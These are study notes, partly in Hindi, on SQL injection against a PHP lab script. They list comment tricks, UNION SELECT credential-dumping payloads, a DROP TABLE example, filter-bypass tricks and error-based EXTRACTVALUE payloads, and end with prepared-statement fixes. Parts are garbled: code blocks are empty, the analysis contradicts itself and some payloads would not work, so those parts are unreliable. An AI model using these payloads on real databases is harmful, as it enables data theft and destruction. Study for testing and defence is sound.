### 1️⃣ No need to “barrack” the query

- आपके PHP कोड में `WHERE id=$id` या `WHERE id='$id'` जैसा query है।
- अगर quotes नहीं हैं, तो आपको payload बिना quotes देना होता है।

### 2️⃣ Join the query using `%23` (जो `#` का URL encoded रूप है)

- `%23` का अर्थ है “#” symbol (URL encoded)।
- SQL में `#` के बाद का हिस्सा comment हो जाता है।
- Example (local testing lab के लिए):
    
    ```

    ```
    
    → `%23` डालने से query का बाक़ी हिस्सा comment बन जाता है।
    

### 3️⃣ Find out how many columns are in the query (ORDER BY)

- यह step यह पता लगाने के लिए होता है कि table में कितने columns हैं।
- Example commands (learning/demo environment में):
    
    ```

    ?id=7 order by 3 --
    
    ```
    
    → जिस value पर error आए, उससे पहले वाली value = total columns.

- “UNION” operator का उपयोग एक ही query में कई results जोड़ने के लिए होता है।

# **SQL-Queries-Barrack-and-Join**

## **SQL Queries (Barrack) and Join**

### **Ways to Comment Out SQL Queries (Barrack)**

- **`-`  (Double hyphen):** Comments out everything after it on the same line. Must be followed by a space or control character.
    - **Example:** `SELECT * FROM users WHERE id=1--`
- **`#` (Hash symbol):** Comments out everything after it on the same line in MySQL.
    - **Example:** `SELECT * FROM users WHERE id=1#`
- **`/* ... */` (C-style block comments):** Comments out everything between `/*` and `/`, which can span multiple lines.
    - **Example:** `SELECT * FROM users /* comment here */ WHERE id=1`
- **Null byte `%00`** (in some DBMS or older versions, e.g., MS Access) to terminate strings or comments.

These comment symbols are used to end or ignore the remaining part of the original valid SQL query when injecting malicious payloads.

### **Ways to Join Queries in SQLi**

- **`UNION SELECT`:** Combines results from multiple `SELECT` statements into a single result set, allowing attackers to extract data from other tables.
    - **Requirements for `UNION`:**
        - 
            - Same number of columns in the original and injected query
        - 
            - Compatible data types in corresponding columns
    - **Example:**SQL
        
        `1 UNION SELECT 1, username, password FROM users--`
        
- **`UNION ALL SELECT`:** Same as `UNION` but returns all rows including duplicates, sometimes used to simplify or increase data retrieval.
- **Multiple Statements Separated by Semicolon (`;`):** Some DBMS allow multiple SQL statements to be executed sequentially in one query separated by `;`. This can be used to run additional malicious queries like `DROP TABLE`.
    - **Example:**SQL
        
        `1 ; DROP TABLE users;--`
        

---

---

- **Inline Comments Inside Keywords:** To bypass keyword detection or blacklists, comments can be inserted inside SQL keywords, for example: `UN/**/ION SELECT` or `SEL/**/ECT` which still parses as **`UNION SELECT`** or **`SELECT`**.

### Obfuscated Whitespace Using Comments:

**Example:**

SQL

# 

`1 OR 1=1/**/`

Here, `/**/` acts like a space.

- **Concatenation in UNION Columns:** To retrieve multiple pieces of data in one column by concatenating them with delimiters, e.g., using **`CONCAT()`** in MySQL or **`||`** in Oracle.

---

## **Summary Table**

| Purpose | Technique / Syntax | Example | Notes |
| --- | --- | --- | --- |
| Commenting SQL | **`--`** | `id=1--` | Must have trailing space |
| Commenting SQL | **`#`** | `id=1#` | MySQL specific |
| Commenting SQL | **`/* ... */`** | `id=1 /* comment */` | Multi-line or inline |
| Join Queries | **`UNION SELECT`** | `UNION SELECT 1,2,3--` | Columns count and types must match |
| Join Queries | **`UNION ALL SELECT`** | `UNION ALL SELECT 1,2,3--` | Includes duplicates |
| Join Queries | **Multiple queries ;** | `; DROP TABLE users;--` | Requires DB support |
| Bypass Filters | **Inline comments inside keywords** | `UN/**/ION SELECT` | Breaks signature matching |
| Whitespace bypass | **Comment as space** | `OR 1=1/**/` | Avoids filters on spaces |

### **Analysis of the Vulnerability**

The vulnerability in this script is a specific type of **Integer-Based SQL Injection**, but with an unusual twist introduced by the variable `$id2`.

1. **Direct Input:** The script directly takes user input from the URL parameter `id` using `$_GET['id']` and stores it in `$id`. This input is *unsanitized*.
2. **The Double-Quote Twist:** The line `$id2 = '"'.$id.'"';` intentionally wraps the user-supplied `$id` value within **double quotes** (`"`).
3. **The Final Query:** The crucial line is the query construction:SQLSQL
    
    `$query = "SELECT * FROM users WHERE id=($id2) LIMIT 0,1";`
    
    If a normal user passes `id=1`, the final SQL query executed is:
    
    `SELECT * FROM users WHERE id=("1") LIMIT 0,1`
    
    In many SQL dialects, this still works because the database often coerces the string `"1"` back into an integer `1` when compared against an integer column like `id`.
    

However, the presence of the enclosing parentheses and the user-controllable double quotes is what makes this vulnerable to an injection attack that doesn't require closing a single quote.

### **Exploitation Technique: Integer-Based UNION Injection**

To exploit this, an attacker doesn't need to worry about the double quotes as much as they need to manipulate the surrounding arithmetic or logical structure. They will use the **`UNION ALL`** technique, combined with **error-based detection** (since the application is set up to output database errors).

The primary goal is to break out of the expression `($id2)`.

| User Input (`id` parameter) | Code's `$id2` (PHP wraps it) | Final SQL Query (Executed) |
| --- | --- | --- |
| **`1) UNION ALL SELECT 1,2,3--`** | **`"1) UNION ALL SELECT 1,2,3--"`** | `SELECT * FROM users WHERE id=("1) UNION ALL SELECT 1,2,3--") LIMIT 0,1` |

**Wait! The Above Query Fails!** The database sees this: `id = ("...string...")`.

### **The Correct Injection Payload (Leveraging the Double Quotes)**

The attacker must find a way to make the double quotes and parentheses benign or bypass them entirely.

1. **Break out of the parenthesis and quotes, and then comment:** The attacker can close the parentheses and use a comment to terminate the rest of the query.SQL
    - **Payload (URL Encoded):** `") UNION ALL SELECT database(), current_user(), 3--`
    - **If the input is just `$id`:** The server converts the double quotes into the string and then the database executes the query.
    
    A simpler, more reliable payload in this double-quoted, parenthesized context would be to rely on the injection point being treated as a numeric expression:
    
    - **Payload:** `1) UNION ALL SELECT 1, group_concat(table_name), 3 FROM information_schema.tables WHERE table_schema=database()--`
    - **Input (`$id`):** `1) UNION ALL SELECT 1, group_concat(table_name), 3 FROM information_schema.tables WHERE table_schema=database()/*`
    
    The PHP script wraps this entire string in quotes, creating:
    
    $id2 = "-1) UNION ALL SELECT 1, group_concat(table_name), 3 FROM information_schema.tables WHERE table_schema=database()/*"
    
    The final query becomes:
    
    `SELECT * FROM users WHERE id=("-1) UNION ALL SELECT 1, group_concat(table_name), 3 FROM information_schema.tables WHERE table_schema=database()/*") LIMIT 0,1`
    

This query will likely fail with a syntax error because the database cannot convert the string containing the `UNION ALL` statement into an integer. However, since the script is designed for **Error-Based SQLi** (`die("Database Query Failed: ". print_r(mysqli_error($connection), true));`), an attacker can use functions like **`EXTRACTVALUE`** or **`UPDATEXML`** which are designed to output the result of a subquery within the error message, thus bypassing the complex string structure.

Example Error-Based Payload (Hypothetical):

id=1 OR EXTRACTVALUE(1, CONCAT(0x7e, (SELECT group_concat(table_name) FROM information_schema.tables), 0x7e))

The application's error handling is the key to exfiltrating data, as it displays the detailed database error message, which can be forced to contain sensitive information.

### **Security Recommendations**

To fix this critical vulnerability, the developer must stop trusting raw user input.

1. **Prepared Statements (Recommended Fix):** Use `mysqli` prepared statements with parameter binding. This ensures the database treats the user input as data, not as executable SQL code.PHP
    
    `$stmt = $connection->prepare("SELECT * FROM users WHERE id=? LIMIT 0,1");
    $stmt->bind_param("s", $id); // Use "i" for integer if you cast it first
    $stmt->execute();
    $result = $stmt->get_result();
    // ... rest of the code`
    
2. **Type Casting/Validation (Minimal Fix):** If the input is expected to be an integer, explicitly cast it to an integer before use.PHP
    
    `$id = (int)$_GET['id'];
    // $id2 and the double quotes are no longer needed
    $query = "SELECT * FROM users WHERE id=$id LIMIT 0,1";`
